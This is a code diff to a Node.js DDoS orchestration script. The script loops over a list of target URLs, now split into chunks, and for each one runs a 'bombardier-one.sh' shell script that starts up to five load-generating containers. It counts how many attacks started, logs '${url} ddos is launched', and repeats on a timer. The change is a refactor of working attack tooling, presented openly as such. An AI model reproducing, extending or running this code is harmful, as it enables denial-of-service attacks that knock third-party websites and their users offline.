@@ -3,9 +3,10 @@ const {
   successLog,
   errorLog,
   logStatistics,
+  chunking
 } = require("./helpers");
 
-const config = require('./config');
+const config = require("./config");
 const { exec } = require("child_process");
 
 const containersLimit = 5;
@@ -28,48 +29,51 @@ const retry = () => {
   let areNotAvailable = 0;
   let stopped = 0;
 
-  for (const url of uniqueUrls) {
-    if (url) {
-      exec(
-        `. ${__dirname}/bombardier-one.sh ${url} ${containersLimit}`,
-        (error, stdout, stderr) => {
-          proceeded++;
+  const chunksUrls = chunking(uniqueUrls);
+  for (const chunk of chunksUrls) {
+    for (const url of chunk) {
+      if (url) {
+        exec(
+          `. ${__dirname}/bombardier-one.sh ${url} ${containersLimit}`,
+          (error, stdout, stderr) => {
+            proceeded++;
 
-          logStatistics({
-            uniqueUrls,
-            launched,
-            areNotAvailable,
-            proceeded,
-            stopped,
-          });
+            logStatistics({
+              uniqueUrls,
+              launched,
+              areNotAvailable,
+              proceeded,
+              stopped,
+            });
 
-          if (error) {
-            errorLog(`error: ${error.message.toString()}`);
-          }
-          if (stderr) {
-            if (stderr.toString().toLowerCase().indexOf("warning:") !== -1) {
-              warningLog(`stderr: ${stderr.toString()}`);
-            } else {
-              errorLog(`stderr: ${stderr.toString()}`);
+            if (error) {
+              errorLog(`error: ${error.message.toString()}`);
+            }
+            if (stderr) {
+              if (stderr.toString().toLowerCase().indexOf("warning:") !== -1) {
+                warningLog(`stderr: ${stderr.toString()}`);
+              } else {
+                errorLog(`stderr: ${stderr.toString()}`);
+              }
+            }
+            if (!error && !stderr) {
+              const out = stdout.toString();
+              if (out.indexOf(launchedStr) !== -1) {
+                launched++;
+                successLog(out);
+                successLog(`${url} ddos is launched`);
+              } else {
+                areNotAvailable++;
+                warningLog(out);
+              }
+
+              if (stdout.indexOf(stoppedStr) !== -1) {
+                stopped++;
+              }
             }
           }
-          if (!error && !stderr) {
-            const out = stdout.toString();
-            if (out.indexOf(launchedStr) !== -1) {
-              launched++;
-              successLog(out);
-              successLog(`${url} ddos is launched`);
-            } else {
-              areNotAvailable++;
-              warningLog(out);
-            }
-
-            if (stdout.indexOf(stoppedStr) !== -1) {
-              stopped++;
-            }
-          }
-        }
-      );
+        );
+      }
     }
   }
   setTimeout(retry, config.timeout);
